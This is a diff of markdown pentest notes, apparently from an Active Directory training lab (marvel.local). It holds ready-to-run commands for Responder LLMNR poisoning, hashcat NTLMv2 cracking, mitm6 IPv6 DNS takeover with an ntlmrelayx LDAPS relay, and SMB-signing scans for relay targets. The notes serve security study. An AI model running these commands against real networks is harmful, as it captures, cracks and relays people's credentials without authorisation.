@@ -6,18 +6,36 @@
 
 LLMNR is like DNS on an internal windows network
 Listen for connections on wrong network drives and retrieve hashes
+* https://github.com/lgandx/Responder
 
 (Impacket toolkit required)
 
 ```
-responder -I eth0 -rdwv
+sudo responder.py -I eth0 -Pv 
 ```
 
 Password cracking with hashcat (NTLMv2)
 
 ```
-hashcat -m 5600 hash.txt rockyou.txt --force
+hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
 ```
+
+## Ipv6 DNS Takeover via mitm6
+
+[GitHub - fox-it/mitm6: pwning IPv4 via IPv6](https://github.com/fox-it/mitm6)
+
+```
+mitm6 -d marvel.local
+```
+
+Setup relay attack
+
+```
+ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
+```
+
+[The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+
 
 ## SMB Relay
 
@@ -26,21 +44,22 @@ Relay hashes we gathered and gain access to specific machines. Relayed user cred
 ### Check if SMB signing is disabled. (Message signing is enabled but not required)
 
 ```
-nmap --script=smb2-security-mode.nse -p445 192.168.57.0
+nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
 
 Save relevant hosts to targets.txt
 ```
 
 Disable smb and http on responder.conf
 
+https://hausec.com/how-to-set-up-ntlmrelayx-py/
 ```
 nano /etc/responder/Responder.conf
 ```
-
 Start listening for events on responder
-
+(python2 and python3 Version)
 ```
-python responder.py -I eth0 -rdwv
+sudo python responder.py -I eth0 -rdwv
+sudo responder.py -I eth0 -Pv 
 ```
 
 Initialize relay
@@ -142,19 +161,3 @@ Rubeus.exe asreproast
 ```
 
 Crack the resulting hashes
-
-## Ipv6 DNS Takeover via mitm6
-
-[GitHub - fox-it/mitm6: pwning IPv4 via IPv6](https://github.com/fox-it/mitm6)
-
-```
-mitm6 -d marvel.local
-```
-
-Setup relay attack
-
-```
-ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
-```
-
-[The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
